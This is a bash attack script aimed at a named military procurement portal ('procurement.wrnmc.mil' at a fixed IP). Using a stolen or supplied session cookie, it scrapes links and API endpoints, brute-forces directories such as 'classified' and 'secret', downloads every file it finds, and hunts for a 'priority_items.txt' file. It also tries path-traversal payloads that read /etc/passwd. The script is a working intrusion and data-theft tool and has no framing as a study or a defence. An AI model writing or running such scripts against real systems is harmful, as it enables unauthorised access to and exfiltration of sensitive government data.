#!/bin/bash

# Target information
TARGET_IP="10.96.34.49"
DOMAIN="procurement.wrnmc.mil"
COOKIE_FILE="cookies.txt"
PORTAL_URL="http://$DOMAIN/portal"

# Common directory wordlist
DIRECTORIES=(
    "documents" "contracts" "procurement" "orders" "inventory" "supplies"
    "assets" "equipment" "medical" "pharmaceutical" "lab" "radiology"
    "surgical" "emergency" "critical" "priority" "classified" "secret"
    "admin" "administrative" "management" "reports" "data" "files"
    "archive" "backup" "config" "configuration" "settings" "system"
    "api" "rest" "graphql" "v1" "v2" "internal" "private" "secure"
    "uploads" "downloads" "export" "import" "transfer" "share"
    "user" "users" "employee" "employees" "staff" "personnel"
    "vendor" "vendors" "supplier" "suppliers" "contractor" "contractors"
    "purchase" "purchasing" "acquisition" "procure" "buy" "order"
    "request" "requests" "requisition" "requisitions" "approval" "approvals"
    "budget" "funding" "finance" "financial" "accounting" "billing"
    "invoice" "invoices" "payment" "payments" "receipt" "receipts"
    "audit" "auditing" "compliance" "regulatory" "legal" "law"
    "security" "secure" "protected" "confidential" "sensitive"
    "log" "logs" "history" "historical" "record" "records"
    "database" "db" "sql" "nosql" "mongo" "postgres" "mysql"
    "backup" "backups" "archive" "archives" "storage" "stored"
    "temp" "tmp" "cache" "cached" "session" "sessions"
    "test" "testing" "dev" "development" "stage" "staging"
    "prod" "production" "live" "active" "current" "present"
    "old" "previous" "legacy" "deprecated" "obsolete" "outdated"
)

# File extensions to try
EXTENSIONS=("" ".txt" ".pdf" ".doc" ".docx" ".xls" ".xlsx" ".csv" ".json" ".xml")

# Function to analyze portal content and extract links
analyze_portal() {
    echo "=== Analyzing Portal Content ==="
    
    # Get portal content
    curl -s -L --resolve "$DOMAIN:80:$TARGET_IP" --resolve "wrnmc.mil:80:$TARGET_IP" \
        -b "$COOKIE_FILE" "$PORTAL_URL" > portal_content.html
    
    echo "Portal content saved to portal_content.html"
    
    # Extract all links from the portal
    echo "=== Extracted Links ==="
    grep -o 'href="[^"]*"' portal_content.html | sed 's/href="//g' | sed 's/"//g' | sort -u > links.txt
    cat links.txt
    
    # Extract all forms from the portal
    echo "=== Extracted Forms ==="
    grep -o '<form[^>]*>' portal_content.html
    
    # Extract JavaScript endpoints
    echo "=== JavaScript Endpoints ==="
    grep -o 'fetch([^)]*)' portal_content.html
    grep -o 'ajax[^)]*)' portal_content.html
    grep -o '\.get[^)]*)' portal_content.html
    grep -o '\.post[^)]*)' portal_content.html
    
    # Look for API endpoints
    echo "=== Potential API Endpoints ==="
    grep -o '/api/[^"'\'']*' portal_content.html | sort -u
    grep -o '/v[0-9]/[^"'\'']*' portal_content.html | sort -u
}

# Function to brute force directories
brute_force_directories() {
    echo "=== Starting Directory Brute Force ==="
    
    # Create results directory
    mkdir -p scan_results
    
    for dir in "${DIRECTORIES[@]}"; do
        echo "Testing: /portal/$dir/"
        
        # Try directory
        response=$(curl -s -o /dev/null -w "%{http_code}" -L \
            --resolve "$DOMAIN:80:$TARGET_IP" --resolve "wrnmc.mil:80:$TARGET_IP" \
            -b "$COOKIE_FILE" "$PORTAL_URL/$dir/")
        
        if [ "$response" -eq 200 ] || [ "$response" -eq 301 ] || [ "$response" -eq 302 ]; then
            echo "✓ FOUND: /portal/$dir/ (HTTP $response)"
            echo "/portal/$dir/" >> scan_results/found_directories.txt
            
            # Get directory listing
            curl -s -L --resolve "$DOMAIN:80:$TARGET_IP" --resolve "wrnmc.mil:80:$TARGET_IP" \
                -b "$COOKIE_FILE" "$PORTAL_URL/$dir/" > "scan_results/${dir}_content.html"
        elif [ "$response" -ne 404 ]; then
            echo "? INTERESTING: /portal/$dir/ (HTTP $response)"
            echo "/portal/$dir/ - HTTP $response" >> scan_results/interesting_responses.txt
        fi
        
        # Try common files in each directory
        for ext in "${EXTENSIONS[@]}"; do
            for file in "index$ext" "readme$ext" "README$ext" "list$ext" "items$ext" "data$ext" "priority_items$ext"; do
                response=$(curl -s -o /dev/null -w "%{http_code}" -L \
                    --resolve "$DOMAIN:80:$TARGET_IP" --resolve "wrnmc.mil:80:$TARGET_IP" \
                    -b "$COOKIE_FILE" "$PORTAL_URL/$dir/$file")
                
                if [ "$response" -eq 200 ]; then
                    echo "✓ FILE FOUND: /portal/$dir/$file"
                    echo "/portal/$dir/$file" >> scan_results/found_files.txt
                    
                    # Download the file
                    curl -s -L --resolve "$DOMAIN:80:$TARGET_IP" --resolve "wrnmc.mil:80:$TARGET_IP" \
                        -b "$COOKIE_FILE" "$PORTAL_URL/$dir/$file" > "scan_results/${dir}_${file}"
                fi
            done
        done
    done
}

# Function to search for priority items
search_priority_items() {
    echo "=== Searching for Priority Items ==="
    
    # Direct paths to try
    PRIORITY_PATHS=(
        "/portal/documents/contracts/priority_items.txt"
        "/portal/contracts/priority_items.txt"
        "/portal/documents/priority_items.txt"
        "/portal/priority_items.txt"
        "/portal/items/priority.txt"
        "/portal/procurement/priority.txt"
        "/portal/inventory/priority.txt"
    )
    
    for path in "${PRIORITY_PATHS[@]}"; do
        echo "Trying: $path"
        response=$(curl -s -o /dev/null -w "%{http_code}" -L \
            --resolve "$DOMAIN:80:$TARGET_IP" --resolve "wrnmc.mil:80:$TARGET_IP" \
            -b "$COOKIE_FILE" "http://$DOMAIN$path")
        
        if [ "$response" -eq 200 ]; then
            echo "✓ FOUND: $path"
            curl -s -L --resolve "$DOMAIN:80:$TARGET_IP" --resolve "wrnmc.mil:80:$TARGET_IP" \
                -b "$COOKIE_FILE" "http://$DOMAIN$path" > "scan_results/priority_items_found.txt"
            cat "scan_results/priority_items_found.txt"
            break
        fi
    done
}

# Function to check for common vulnerabilities
check_vulnerabilities() {
    echo "=== Checking for Common Vulnerabilities ==="
    
    # Test for path traversal
    echo "Testing path traversal..."
    TRAVERSAL_PATHS=(
        "../../../../etc/passwd"
        "....//....//....//etc/passwd"
        "../contracts/priority_items.txt"
    )
    
    for path in "${TRAVERSAL_PATHS[@]}"; do
        response=$(curl -s -o /dev/null -w "%{http_code}" -L \
            --resolve "$DOMAIN:80:$TARGET_IP" --resolve "wrnmc.mil:80:$TARGET_IP" \
            -b "$COOKIE_FILE" "$PORTAL_URL/$path")
        
        if [ "$response" -eq 200 ]; then
            echo "⚠ POSSIBLE VULNERABILITY: Path traversal - $path (HTTP $response)"
        fi
    done
}

# Main execution
main() {
    echo "Starting Portal Analysis and Directory Brute Force"
    echo "Target: $DOMAIN ($TARGET_IP)"
    echo "Cookies: $COOKIE_FILE"
    echo "========================================="
    
    # Check if we can access the portal first
    echo "Testing portal access..."
    portal_response=$(curl -s -o /dev/null -w "%{http_code}" -L \
        --resolve "$DOMAIN:80:$TARGET_IP" --resolve "wrnmc.mil:80:$TARGET_IP" \
        -b "$COOKIE_FILE" "$PORTAL_URL")
    
    if [ "$portal_response" -ne 200 ]; then
        echo "❌ Cannot access portal (HTTP $portal_response). Check cookies and authentication."
        exit 1
    fi
    
    echo "✓ Portal accessible (HTTP $portal_response)"
    
    # Run all scans
    analyze_portal
    brute_force_directories
    search_priority_items
    check_vulnerabilities
    
    echo "========================================="
    echo "Scan complete! Check scan_results/ directory for findings."
    echo "Found directories: $(cat scan_results/found_directories.txt 2>/dev/null | wc -l)"
    echo "Found files: $(cat scan_results/found_files.txt 2>/dev/null | wc -l)"
}

# Run the script
main